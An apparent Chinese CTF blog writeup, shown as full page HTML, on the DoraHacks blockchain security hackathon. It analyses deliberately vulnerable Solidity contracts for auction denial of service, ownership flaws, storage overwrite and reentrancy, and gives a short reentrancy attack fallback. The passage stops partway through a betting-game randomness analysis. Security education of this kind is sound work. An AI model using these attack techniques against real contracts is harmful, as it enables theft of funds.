@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Sissel">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sissel">
+    
+    <meta name="keywords" content="天枢,Dubhe,CTFer,程序员">
+    
+    <meta name="description" content="长颈鹿的脖子为什么那么长？">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>【writeup】DoraHacks 区块链安全Hackathon · Sissel&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sissel&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【writeup】DoraHacks 区块链安全Hackathon</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sissel's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            【writeup】DoraHacks 区块链安全Hackathon
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "区块链">区块链</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "智能合约">智能合约</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.3k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/15</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>早先就对DoraHacks举办的各种hackathon有所耳闻，一直想来参加感受一次，这次很高兴天枢能够受邀参加本场区块链安全比赛，与诸位师傅共同度过一个知性而优雅的周末。各大厂商在周六都分享了许多有意思的思路、或是自家引以为傲的产品和解决方案，开拓了我和小伙伴们的眼界。一下午的展示中收获了良多干货，为第二天的比赛也开拓了思路。</p>
+<p>本次见识到了平时只能在线上看到的诸位大师傅，也有幸享受到了师傅们精心准备的题目，包含了合约审计、漏洞利用、硬件方案、密码学、交易所安全等多个类型，受益良多。也吐槽一句，师傅们颜值都好高呀！</p>
+<p>这里给出Q1、4、11、14、15 我们队的解答。</p>
+<a id="more"></a>
+<h2 id="题目wp"><a href="#题目wp" class="headerlink" title="题目wp"></a>题目wp</h2><h3 id="Q1-测试题"><a href="#Q1-测试题" class="headerlink" title="Q1 - 测试题"></a>Q1 - 测试题</h3><p>主办方提供了四个合约，需要我们给出漏洞点和修复方案，并按要求对某几个合约写出攻击合约。</p>
+<h4 id="Auction-sol"><a href="#Auction-sol" class="headerlink" title="Auction.sol"></a>Auction.sol</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Auction &#123;</span><br><span class="line">    address public highestBidder;</span><br><span class="line">    uint256 public highestBid;</span><br><span class="line"></span><br><span class="line">    function Auction(uint256 _highestBid) &#123;</span><br><span class="line">        require(_highestBid &gt; 0);</span><br><span class="line">        // 设置起拍价格        </span><br><span class="line">        highestBid = _highestBid;</span><br><span class="line">        highestBidder = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function bid() payable &#123;</span><br><span class="line">        require(msg.value &gt; highestBid);</span><br><span class="line">        // 退还上一位竞拍者资金</span><br><span class="line">        highestBidder.transfer(highestBid);</span><br><span class="line"></span><br><span class="line">        highestBidder = msg.sender;</span><br><span class="line">        highestBid = msg.value;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 根据区块高度或者时间等，结束拍卖</span><br><span class="line">    function auction_end() &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很典型的King/拍卖合约，问题出在了出现下一个高价者时，上一个人退款时的transfer()。我们可以构造一个攻击合约，他的回调函数是payable，且函数中revert()或throw。即让我们的攻击合约，作为最高出价者，并且不能接受转账即可。</p>
+<h4 id="BankOwned-sol"><a href="#BankOwned-sol" class="headerlink" title="BankOwned.sol"></a>BankOwned.sol</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Owned &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    function Owned() &#123; owner = msg.sender; &#125;</span><br><span class="line">    modifier onlyOwner&#123; if (msg.sender != owner) revert(); _; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bank is Owned &#123;</span><br><span class="line">    address public owner = msg.sender;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function transferOwner(address new_owner) public onlyOwner payable &#123;</span><br><span class="line">         owner = new_owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public onlyOwner &#123;</span><br><span class="line">        require(amount &lt;= this.balance);</span><br><span class="line">        msg.sender.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我认为是继承了Owned()函数，出现了问题，solidity的继承原理是代码拷贝，所有人都可以调用Bank里的Owned函数，但我之后并未调通，希望大家指正这里。</p>
+<h4 id="MyContacts-sol"><a href="#MyContacts-sol" class="headerlink" title="MyContacts.sol"></a>MyContacts.sol</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract MyContacts &#123;</span><br><span class="line"></span><br><span class="line">        struct PersonInfo &#123;</span><br><span class="line">            address person;</span><br><span class="line">            string phoneNumber;</span><br><span class="line">            string note;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        address private owner;</span><br><span class="line">        </span><br><span class="line">        mapping(address =&gt; PersonInfo) contacts;</span><br><span class="line"></span><br><span class="line">        function MyContacts() &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function addContact(address _person, string _phoneNumber, string _note) public &#123;</span><br><span class="line">            PersonInfo info;</span><br><span class="line">            info.person = _person;</span><br><span class="line">            info.phoneNumber = _phoneNumber;</span><br><span class="line">            info.note = _note;</span><br><span class="line">            contacts[msg.sender] = info;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在函数里声明，会覆盖变量。</p>
+<p>这里举个<a href="https://paper.seebug.org/661/" target="_blank" rel="noopener">启明的文章</a>，方便理解，师傅们在第一天的演讲中也提到了这一点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract test &#123;</span><br><span class="line"></span><br><span class="line">    struct aa&#123;</span><br><span class="line">        uint x;</span><br><span class="line">        uint y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint public a = 4;</span><br><span class="line">    uint public b = 6;</span><br><span class="line"></span><br><span class="line">    function test1() returns (uint)&#123;</span><br><span class="line">        aa x;</span><br><span class="line">        x.x = 9;</span><br><span class="line">        x.y = 7;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>函数test1中定义了一个局部结构体变量x，但是没有对其进行初始化。根据solidity的变量存储规则，这时候x是存储在storage中的，而且是从索引0开始，那么对其成员变量x,y赋值之后，刚好覆盖了全局变量a和b。</p>
+<h4 id="PrivateBank-sol"><a href="#PrivateBank-sol" class="headerlink" title="PrivateBank.sol"></a>PrivateBank.sol</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.15;</span><br><span class="line"></span><br><span class="line">contract PrivateBank &#123;</span><br><span class="line">    mapping (address =&gt; uint) userBalance;</span><br><span class="line">   </span><br><span class="line">    function getBalance(address u) constant returns(uint)&#123;</span><br><span class="line">        return userBalance[u];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToBalance() payable&#123;</span><br><span class="line">        userBalance[msg.sender] += msg.value;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    function withdrawBalance()&#123;</span><br><span class="line">        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) )&#123;</span><br><span class="line">            throw;</span><br><span class="line">        &#125;</span><br><span class="line">        userBalance[msg.sender] = 0;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看名字都猜出来了，肯定是重入漏洞啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg.sender.call.value(userBalance[msg.sender])()</span><br></pre></td></tr></table></figure></p>
+<p>攻击的话call一下就好了hhh。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先让攻击合约充一点钱</span><br><span class="line">function () payable public&#123;</span><br><span class="line">    victim.call(bytes4(keccak256(&quot;withdrawBalance()&quot;)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Q4-游戏逻辑题，找出三个漏洞"><a href="#Q4-游戏逻辑题，找出三个漏洞" class="headerlink" title="Q4 - 游戏逻辑题，找出三个漏洞"></a>Q4 - 游戏逻辑题，找出三个漏洞</h3><p>这个题最后只有我们天枢给出了主办方满意的回答，已经在赛后分享和大家讨论过了。</p>
+<p>也是之前在创宇404的时候，和Lorexxar’师傅经常一起审合约，养成的好习惯。很喜欢这道题，出题的师傅说，请大家把它仅仅当作游戏合约来看待，而不是蜜罐之类的hh。我还蛮喜欢这种心态的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">// Bet Game</span><br><span class="line">contract BetGame &#123;</span><br><span class="line">	address owner;					                // 合约持有者</span><br><span class="line">	mapping(address =&gt; uint256) public balanceOf;	// 用户资金集</span><br><span class="line">	</span><br><span class="line">	uint256 public cutOffBlockNumber;		        // 下注截止到cutOffBlockNumber,至少有1000个块的距离到创建合约的块</span><br><span class="line">	uint256 public status; 				            // 状态，根据每次下注修改状态</span><br><span class="line">	mapping(address =&gt; uint256) public positiveSet;	// 赌注正面赢: status == 1</span><br><span class="line">	mapping(address =&gt; uint256) public negativeSet;	// 赌注反面赢: status == 0</span><br><span class="line">	uint256 public positiveBalance;			        // 正面下注资金总额</span><br><span class="line">	uint256 public negativeBalance;			        // 反面下注资金总额</span><br><span class="line"></span><br><span class="line">	modifier isOwner &#123;</span><br><span class="line">		assert(owner == msg.sender);</span><br><span class="line">		_;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	modifier isRunning &#123;</span><br><span class="line">		assert(block.number &lt; cutOffBlockNumber);</span><br><span class="line">		_;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	modifier isStop &#123;</span><br><span class="line">		assert(block.number &gt;= cutOffBlockNumber);</span><br><span class="line">		_;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	constructor(uint256 _cutOffBlockNumber) public &#123;</span><br><span class="line">		owner = msg.sender;			</span><br><span class="line">		balanceOf[owner] = 100000000000;</span><br><span class="line">        cutOffBlockNumber = _cutOffBlockNumber;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">    	require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">    	require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">    	balanceOf[msg.sender] -= value;</span><br><span class="line">    	balanceOf[to] += value;</span><br><span class="line">    	return true;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 下注并影响状态，该操作必须在赌局结束之前</span><br><span class="line">	function bet(uint256 value, bool positive) isRunning public returns(bool success) &#123;</span><br><span class="line">		require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">		balanceOf[msg.sender] -= value;</span><br><span class="line">		if (positive == true) &#123;</span><br><span class="line">			positiveSet[msg.sender] += value;</span><br><span class="line">			positiveBalance += value;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			negativeSet[msg.sender] += value;</span><br><span class="line">			negativeBalance += value;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		bytes32 result = keccak256(abi.encodePacked(blockhash(block.number), msg.sender, block.timestamp));</span><br><span class="line">		uint8 flags = (uint8)(result &amp; 0xFF);	// 取一个字节，根据值的大小决定状态</span><br><span class="line">		if (flags &gt; 128) &#123;</span><br><span class="line">			status = 1;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			status = 0;</span><br><span class="line">		&#125;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 猜对就取回成本和猜对所得（猜错将不能取回成本），该操作必须在赌局结束以后</span><br><span class="line">	function withdraw() isStop public returns (bool success)&#123;</span><br><span class="line">		uint256 betBalance;</span><br><span class="line">		uint256 reward;</span><br><span class="line">		if (status == 1) &#123; // positiveSet</span><br><span class="line">			betBalance = positiveSet[msg.sender];</span><br><span class="line">			if (betBalance &gt; 0) &#123;</span><br><span class="line">			    balanceOf[msg.sender] += betBalance;</span><br><span class="line">				positiveSet[msg.sender] -= betBalance;</span><br><span class="line">				positiveBalance -= betBalance;</span><br><span class="line">				reward = (betBalance * negativeBalance) / positiveBalance;</span><br><span class="line">				negativeBalance -= reward;</span><br><span class="line">				balanceOf[msg.sender] += reward;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; else if (status == 0) &#123;</span><br><span class="line">			betBalance = negativeSet[msg.sender];</span><br><span class="line">			if (betBalance &gt; 0) &#123;</span><br><span class="line">			    balanceOf[msg.sender] += betBalance;</span><br><span class="line">				negativeSet[msg.sender] -= betBalance;</span><br><span class="line">				negativeBalance -= betBalance;</span><br><span class="line">				reward = (betBalance * positiveBalance) / negativeBalance;</span><br><span class="line">				positiveBalance -= reward;</span><br><span class="line">				balanceOf[msg.sender] += reward;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不按审合约正确的套路写了，这里给出我的答案，前三个是师傅的预期解。</p>
+<h4 id="随机数分布不均"><a href="#随机数分布不均" class="headerlink" title="随机数分布不均"></a>随机数分布不均</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (flags &gt; 128) &#123;</span><br><span class="line">    status = 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    status = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正:反 = 129:127</p>
